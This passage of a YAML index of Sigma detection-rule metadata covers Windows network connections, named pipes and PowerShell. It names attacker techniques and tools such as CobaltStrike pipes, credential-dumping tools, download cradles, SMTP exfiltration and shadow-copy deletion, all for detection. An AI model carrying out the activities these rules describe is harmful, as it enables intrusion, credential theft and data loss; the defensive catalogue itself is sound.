  techniques:
  - T1055
  - T1218
  tags:
  - attack.privilege-escalation
  - attack.t1055
  - attack.t1218
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-november-2021/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9976fa64-2804-423c-8a5b-646ade840773
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_outbound_smtp_connections.yml
  name: Suspicious Outbound SMTP Connections
  description: 'Adversaries may steal data by exfiltrating it over an un-encrypted
    network protocol other than that of the existing command and control channel.

    The data may also be sent to an alternate network location from the main command
    and control server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp
  - https://www.ietf.org/rfc/rfc2821.txt
  false_positives:
  - Other SMTP tools
  notes: ''
- detection_id: c539afac-c12a-46ed-b1bd-5a5567c9f045
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_remote_powershell_session.yml
  name: Potential Remote PowerShell Session Initiated
  description: 'Detects a process that initiated a network connection over ports 5985
    or 5986 from a non-network service account.

    This could potentially indicates a remote PowerShell connection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.006
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html
  false_positives:
  - Legitimate usage of remote PowerShell, e.g. remote administration and monitoring.
  - Network Service user name of a not-covered localization
  notes: ''
- detection_id: 7610a4ea-c06d-495f-a2ac-0a696abcfd3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_winlogon_net_connections.yml
  name: Outbound Network Connection To Public IP Via Winlogon
  description: Detects a "winlogon.exe" process that initiate network communications
    with public IP addresses
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.command-and-control
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  false_positives:
  - Communication to other corporate systems that use IP addresses from public address
    spaces
  notes: ''
- detection_id: 786cdae8-fefb-4eb2-9227-04e34060db01
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_wordpad_uncommon_ports.yml
  name: Suspicious Wordpad Outbound Connections
  description: 'Detects a network connection initiated by "wordpad.exe" over uncommon
    destination ports.

    This might indicate potential process injection activity from a beacon or similar
    mechanisms.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Other ports can be used, apply additional filters accordingly
  notes: ''
- detection_id: 08249dc0-a28d-4555-8ba5-9255a198e08c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_wscript_cscript_local_connection.yml
  name: Local Network Connection Initiated By Script Interpreter
  description: 'Detects a script interpreter (Wscript/Cscript) initiating a local
    network connection to download or execute a script hosted on a shared folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md
  false_positives:
  - Legitimate scripts
  notes: ''
- detection_id: 992a6cae-db6a-43c8-9cec-76d7195c96fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_wscript_cscript_outbound_connection.yml
  name: Outbound Network Connection Initiated By Script Interpreter
  description: Detects a script interpreter wscript/cscript opening a network connection
    to a non-local network. Adversaries may use script to download malicious payloads.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md
  false_positives:
  - Legitimate scripts
  notes: ''
- detection_id: c649a6c7-cd8c-4a78-9c04-000fc76df954
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_wuauclt_network_connection.yml
  name: Potentially Suspicious Wuauclt Network Connection
  description: 'Detects the use of the Windows Update Client binary (wuauclt.exe)
    to proxy execute code and making network connections.

    One could easily make the DLL spawn a new process and inject to it to proxy the
    network connection and bypass this rule.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://dtm.uk/wuauclt/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ea13e8c-03ea-409b-877d-ce5c3d2c1cb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_adfs_namedpipe_connection_uncommon_tool.yml
  name: ADFS Database Named Pipe Connection By Uncommon Tool
  description: 'Detects suspicious local connections via a named pipe to the AD FS
    configuration database (Windows Internal Database).

    Used to access information such as the AD FS configuration settings which contains
    sensitive information used to sign SAML tokens.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  tags:
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/SecurityEvent/ADFSDBNamedPipeConnection.yaml
  - https://o365blog.com/post/adfs/
  - https://github.com/Azure/SimuLand
  false_positives:
  - Unknown
  notes: ''
- detection_id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
  name: CobaltStrike Named Pipe
  description: Detects the creation of a named pipe as used by CobaltStrike
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://twitter.com/d4rksystem/status/1357010969264873472
  - https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/
  - https://github.com/SigmaHQ/sigma/issues/253
  - https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/
  - https://redcanary.com/threat-detection-report/threats/cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0e7163d4-9e19-4fa7-9be6-000c61aad77a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike_re.yml
  name: CobaltStrike Named Pipe Pattern Regex
  description: Detects the creation of a named pipe matching a pattern used by CobaltStrike
    Malleable C2 profiles
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575
  - https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike_susp_pipe_patterns.yml
  name: CobaltStrike Named Pipe Patterns
  description: Detects the creation of a named pipe with a pattern found in CobaltStrike
    malleable C2 profiles
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - stp.1k
  time_window: ''
  references:
  - https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575
  - https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752
  false_positives:
  - Chrome instances using the exact same pipe name "mojo.xxx"
  - Websense Endpoint using the pipe name "DserNamePipe(R|W)\d{1,5}"
  notes: ''
- detection_id: 4d0083b3-580b-40da-9bba-626c19fe4033
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_coercedpotato.yml
  name: HackTool - CoercedPotato Named Pipe Creation
  description: Detects the pattern of a pipe name as used by the hack tool CoercedPotato
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://blog.hackvens.fr/articles/CoercedPotato.html
  - https://github.com/hackvens/CoercedPotato
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f7025a6-e747-4130-aac4-961eb47015f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_diagtrack_eop.yml
  name: HackTool - DiagTrackEoP Default Named Pipe
  description: Detects creation of default named pipe used by the DiagTrackEoP POC,
    a tool that abuses "SeImpersonate" privilege.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/Wh04m1001/DiagTrackEoP/blob/3a2fc99c9700623eb7dc7d4b5f314fd9ce5ef51f/main.cpp#L22
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 637f689e-b4a5-4a86-be0e-0100a0a33ba2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_efspotato.yml
  name: HackTool - EfsPotato Named Pipe Creation
  description: Detects the pattern of a pipe name as used by the hack tool EfsPotato
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1429530155291193354?s=20
  - https://github.com/zcgonvh/EfsPotato
  false_positives:
  - \pipe\LOCAL\Monitorian
  notes: ''
- detection_id: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_generic_cred_dump_tools_pipes.yml
  name: HackTool - Credential Dumping Tools Named Pipe Created
  description: Detects well-known credential dumping tools execution via specific
    named pipe creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.004
  - T1003.005
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.005
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://image.slidesharecdn.com/zeronights2017kheirkhabarov-171118103000/75/hunting-for-credentials-dumping-in-windows-environment-57-2048.jpg?cb=1666035799
  false_positives:
  - Legitimate Administrator using tool for password recovery
  notes: ''
- detection_id: 0adc67e0-a68f-4ffd-9c43-28905aad5d6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_hktl_koh_default_pipe.yml
  name: HackTool - Koh Default Named Pipe
  description: Detects creation of default named pipes used by the Koh tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1528
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1528
  - attack.t1134.001
  time_window: ''
  references:
  - https://github.com/GhostPack/Koh/blob/0283d9f3f91cf74732ad377821986cfcb088e20a/Clients/BOF/KohClient.c#L12
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 58cb02d5-78ce-4692-b3e1-dce850aae41a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_powershell_alternate_host_pipe.yml
  name: Alternate PowerShell Hosts Pipe
  description: Detects alternate PowerShell hosts potentially bypassing detections
    looking for powershell.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190610-PwshAlternateHosts/notebook.html
  - https://threathunterplaybook.com/hunts/windows/190410-LocalPwshExecution/notebook.html
  false_positives:
  - Programs using PowerShell directly without invocation of a dedicated interpreter.
  notes: ''
- detection_id: ac7102b4-9e1e-4802-9b4f-17c5524c015c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_powershell_execution_pipe.yml
  name: New PowerShell Instance Created
  description: Detects the execution of PowerShell via the creation of a named pipe
    starting with PSHost
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: informational
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190610-PwshAlternateHosts/notebook.html
  - https://threathunterplaybook.com/hunts/windows/190410-LocalPwshExecution/notebook.html
  false_positives:
  - Likely
  notes: ''
- detection_id: f318b911-ea88-43f4-9281-0de23ede628e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_pua_csexec_default_pipe.yml
  name: PUA - CSExec Default Named Pipe
  description: Detects default CSExec pipe creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1569.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  - https://github.com/malcomvetter/CSExec
  false_positives:
  - Legitimate Administrator activity
  notes: ''
- detection_id: f6451de4-df0a-41fa-8d72-b39f54a08db5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_pua_paexec_default_pipe.yml
  name: PUA - PAExec Default Named Pipe
  description: Detects PAExec default named pipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Command%20and%20Control/C2-NamedPipe.md
  - https://github.com/poweradminllc/PAExec
  false_positives:
  - Unknown
  notes: ''
- detection_id: d36f87ea-c403-44d2-aa79-1a0ac7c24456
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_pua_remcom_default_pipe.yml
  name: PUA - RemCom Default Named Pipe
  description: Detects default RemCom pipe creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1569.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  - https://github.com/kavika13/RemCom
  false_positives:
  - Legitimate Administrator activity
  notes: ''
- detection_id: 493fb4ab-cdcc-4c4f-818c-0e363bd1e4bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_scrcons_wmi_consumer_namedpipe.yml
  name: WMI Event Consumer Created Named Pipe
  description: Detects the WMI Event Consumer service scrcons.exe creating a named
    pipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.t1047
  - attack.execution
  time_window: ''
  references:
  - https://github.com/RiccardoAncarani/LiquidSnake
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe3ac066-98bb-432a-b1e7-a5229cb39d4a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_susp_malicious_namedpipes.yml
  name: Malicious Named Pipe Created
  description: Detects the creation of a named pipe seen used by known APTs or malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/
  - https://securelist.com/faq-the-projectsauron-apt/75533/
  - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
  - https://www.us-cert.gov/ncas/alerts/TA17-117A
  - https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html
  - https://thedfirreport.com/2020/06/21/snatch-ransomware/
  - https://github.com/RiccardoAncarani/LiquidSnake
  - https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity
  - https://us-cert.cisa.gov/ncas/analysis-reports/ar19-304a
  - https://download.bitdefender.com/resources/files/News/CaseStudies/study/115/Bitdefender-Whitepaper-PAC-A4-en-EN1.pdf
  - https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41504465-5e3a-4a5b-a5b4-2a0baadd4463
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/pipe_created/pipe_created_sysinternals_psexec_default_pipe_susp_location.yml
  name: PsExec Tool Execution From Suspicious Locations - PipeName
  description: Detects PsExec default pipe creation where the image executed is located
    in a suspicious location. Which could indicate that the tool is being used in
    an attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://jpcertcc.github.io/ToolAnalysisResultSheet
  false_positives:
  - Rare legitimate use of psexec from the locations mentioned above. This will require
    initial tuning based on your environment.
  notes: ''
- detection_id: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_abuse_nslookup_with_dns_records.yml
  name: Nslookup PowerShell Download Cradle
  description: Detects a powershell download cradle using nslookup. This cradle uses
    nslookup to extract payloads from DNS records.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/Alh4zr3d/status/1566489367232651264
  false_positives:
  - Unknown
  notes: ''
- detection_id: 87df9ee1-5416-453a-8a08-e8d4a51e9ce1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_delete_volume_shadow_copies.yml
  name: Delete Volume Shadow Copies Via WMI With PowerShell
  description: Shadow Copies deletion using operating systems utilities via PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md
  - https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods
  false_positives:
  - Legitimate Administrator deletes Shadow Copies using operating systems utilities
    for legitimate reason
  notes: ''
- detection_id: 6331d09b-4785-4c13-980f-f96661356249
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_downgrade_attack.yml
  name: PowerShell Downgrade Attack - PowerShell
  description: Detects PowerShell downgrade attack by comparing the host versions
    with the actually used engine version 2.0
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c70e019b-1479-4b65-b0cc-cd0c6093a599
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_exe_calling_ps.yml
  name: PowerShell Called from an Executable Version Mismatch
  description: Detects PowerShell called from an executable by the version mismatch
    method
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  false_positives:
  - Unknown
  notes: ''
- detection_id: c5b20776-639a-49bf-94c7-84f912b91c15
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_powercat.yml
  name: Netcat The Powershell Version
  description: Adversaries may use a non-application layer protocol for communication
    between host and C2 server or among infected hosts within a network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics: []
  techniques:
  - T1095
  tags:
  - attack.command-and-control
  - attack.t1095
  time_window: ''
  references:
  - https://nmap.org/ncat/
  - https://github.com/besimorhino/powercat
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60167e5c-84b2-4c95-a7ac-86281f27c445
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_remote_powershell_session.yml
  name: Remote PowerShell Session (PS Classic)
  description: Detects remote PowerShell sessions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.006
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html
  false_positives:
  - Legitimate use remote PowerShell sessions
  notes: ''
- detection_id: f65e22f9-819e-4f96-9c7b-498364ae7a25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_remotefxvgpudisablement_abuse.yml
  name: Potential RemoteFXvGPUDisablement.EXE Abuse
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of  the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: powershell-classic
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 30a8cb77-8eb3-4cfb-8e79-ad457c5a4592
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_classic/posh_pc_renamed_powershell.yml
  name: Renamed Powershell Under Powershell Channel
  description: 'Detects a renamed Powershell execution, which is a common technique
    used to circumvent security controls and bypass detection logic that''s dependent
    on process names and process paths.

    '
  query_language: sigma
